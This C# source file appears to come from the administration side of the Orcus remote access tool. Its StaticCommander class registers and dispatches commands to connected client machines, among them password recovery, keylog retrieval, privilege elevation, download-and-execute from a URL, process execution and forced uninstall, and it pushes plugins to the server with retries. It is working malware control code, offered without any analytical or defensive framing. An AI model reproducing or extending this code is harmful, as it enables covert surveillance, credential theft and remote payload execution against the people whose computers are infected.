using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Orcus.Administration.Core.CrowdControl;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Plugins.Administration;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands;
using Orcus.StaticCommands.Client;
using Orcus.StaticCommands.Computer;
using Orcus.StaticCommands.Interaction;
using Orcus.StaticCommands.System;

namespace Orcus.Administration.Core.CommandManagement
{
    public class StaticCommander : IStaticCommander
    {
        private readonly ConnectionManager _connectionManager;

        static StaticCommander()
        {
            StaticCommands =
                new Dictionary<Type, StaticCommandPlugin>(
                    new[]
                    {
                        typeof(KillCommand), typeof(MakeAdminCommand), typeof(PasswordRecoveryCommand),
                        typeof(RequestKeyLogCommand), typeof(UninstallCommand), typeof(UpdateCommand),
                        typeof(UpdateFromUrlCommand), typeof(ChangeComputerStateCommand),
                        typeof(ChangeWallpaperCommand), typeof(DownloadAndExecuteCommand),
                        typeof(DownloadAndExecuteFromUrlCommand), typeof(OpenWebsiteCommand),
                        typeof(ExecuteProcessCommand), typeof(WakeOnLanCommand),
                        typeof(ShowMessageBoxCommand), typeof(ShowBalloonTooltipCommand),
                        typeof(OpenTextInNotepadCommand), typeof(SystemLockCommand)
                    }.ToDictionary(x => x, y => (StaticCommandPlugin) null));

            foreach (var plugin in PluginManager.Current.LoadedPlugins.OfType<StaticCommandPlugin>())
                foreach (var staticCommandType in plugin.StaticCommandTypes)
                    StaticCommands.Add(staticCommandType, plugin);
        }

        public static Dictionary<Type, StaticCommandPlugin> StaticCommands { get; }

        public StaticCommander(ConnectionManager connectionManager)
        {
            _connectionManager = connectionManager;
        }

        public static List<StaticCommand> GetStaticCommands()
        {
            return StaticCommands.Select(x => (StaticCommand) Activator.CreateInstance(x.Key)).ToList();
        }

        List<StaticCommand> IStaticCommander.GetStaticCommands()
        {
            return GetStaticCommands();
        }

        public Task<bool> ExecutePreset(CommandPresetWithTarget commandPresetWithTarget)
        {
            return ExecuteCommand(commandPresetWithTarget.StaticCommand, commandPresetWithTarget.TransmissionEvent,
                commandPresetWithTarget.ExecutionEvent, commandPresetWithTarget.StopEvent,
                commandPresetWithTarget.Conditions, commandPresetWithTarget.CommandTarget);
        }

        public Task<bool> ExecutePreset(CommandPreset commandPreset, CommandTarget commandTarget)
        {
            return ExecuteCommand(commandPreset.StaticCommand, commandPreset.TransmissionEvent,
                commandPreset.ExecutionEvent, commandPreset.StopEvent, null, commandTarget);
        }

        public async Task<bool> UploadPluginToServer(StaticCommandPlugin staticCommandPlugin)
        {
            if (await Task.Run(() => _connectionManager.IsStaticCommandPluginAvailable(staticCommandPlugin.PluginHash)))
                return true;

            bool success = false;

            //3 tries
            for (int i = 0; i < 3; i++)
            {
                var autoResetEvent = new AutoResetEvent(false);

                EventHandler<byte[]> pluginReceivedHandler = (sender, bytes) =>
                {
                    if (bytes.SequenceEqual(staticCommandPlugin.PluginHash))
                    {
                        success = true;
                        autoResetEvent.Set();
                    }
                };

                EventHandler<byte[]> pluginFailedHandler = (sender, bytes) =>
                {
                    if (bytes.SequenceEqual(staticCommandPlugin.PluginHash))
                    {
                        success = false;
                        autoResetEvent.Set();
                    }
                };
                _connectionManager.StaticCommandReceived += pluginReceivedHandler;
                _connectionManager.StaticCommandTransmissionFailed += pluginFailedHandler;

                try
                {
                    await Task.Run(() => _connectionManager.SendStaticCommandPlugin(staticCommandPlugin));
                    if (!await Task.Run(() => autoResetEvent.WaitOne()) || !success)
                        continue;
                }
                finally
                {
                    _connectionManager.StaticCommandReceived -= pluginReceivedHandler;
                    _connectionManager.StaticCommandTransmissionFailed -= pluginFailedHandler;
                    autoResetEvent.Dispose();
                }

                break;
            }

            return success;
        }

        public async Task<bool> ExecuteCommand(StaticCommand staticCommand, TransmissionEvent transmissionEvent,
            ExecutionEvent executionEvent, StopEvent stopEvent, List<Condition> conditions, CommandTarget target)
        {
            if (conditions != null && conditions.Count == 0)
                conditions = null;

            var plugin = StaticCommands[staticCommand.GetType()];
            if (plugin != null)
            {
                if (!await UploadPluginToServer(plugin))
                    return false;
            }

            _connectionManager.SendCommand(new DynamicCommand
            {
                CommandId = staticCommand.CommandId,
                Target = target,
                Conditions = conditions,
                TransmissionEvent = transmissionEvent,
                ExecutionEvent = executionEvent,
                CommandParameter = staticCommand.GetCommandParameter().Data,
                PluginHash = plugin?.PluginHash,
                StopEvent = stopEvent
            });

            return true;
        }
    }
}